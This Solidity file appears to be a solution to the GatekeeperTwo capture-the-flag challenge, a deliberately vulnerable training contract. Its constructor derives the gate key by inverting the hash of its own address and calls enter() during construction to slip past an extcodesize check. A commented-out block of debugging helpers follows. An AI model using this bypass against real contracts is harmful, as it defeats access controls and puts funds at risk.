// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GateEnterer {

address public gateAddress;
GatekeeperTwo public gatekeeperTwo;
bytes8 public gateKey;


constructor(address _address) {
    GatekeeperTwo gateTwo = GatekeeperTwo(_address);
    uint64 a;
    uint64 b;
    a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    b = ~a;

    gateTwo.enter(
        //figure out the right number and use that to call.
        bytes8(b)
    );

}
/*
function setGateAddress(address _addr) public {
    gateAddress = _addr;
    gatekeeperTwo = GatekeeperTwo(gateAddress);
}

 function enter(bytes8 _gateKey) public {
     gatekeeperTwo.enter(_gateKey);
    }

 function enterThree(bytes8 _gateKey) public { 
     gatekeeperTwo.enterThree(_gateKey);
    }


//uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == 
//type(uint64).max)
function gateThreeD() public pure returns (bytes8) {
    return bytes8(type(uint64).max);
}

function gateThreeC() public pure returns (uint64) {
    return type(uint64).max;
}

function gateThreeB(bytes8 _gateKey) public pure returns (uint64) {
    return uint64(_gateKey);
}

function gateThreeA() public view returns (uint64) {
    return uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
}

function gateThreeE(bytes8 _gateKey) public view returns (uint64) {
    return uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey);
}

function not() external view returns (uint64) {
    return ~ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
}
function notTwo(uint64 x) external pure returns (uint64) {
    return ~ x;
}

function addressUint() public view returns (uint64) {
    return gatekeeperTwo.addressUint();
}

function gateThreeF(bytes8 _gateKey) public returns (bool) {
    if (uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey) == type(uint64).max) {
        gateKey = _gateKey;
        return true;
    }
    else {
        return false;
    } 
}

*/
}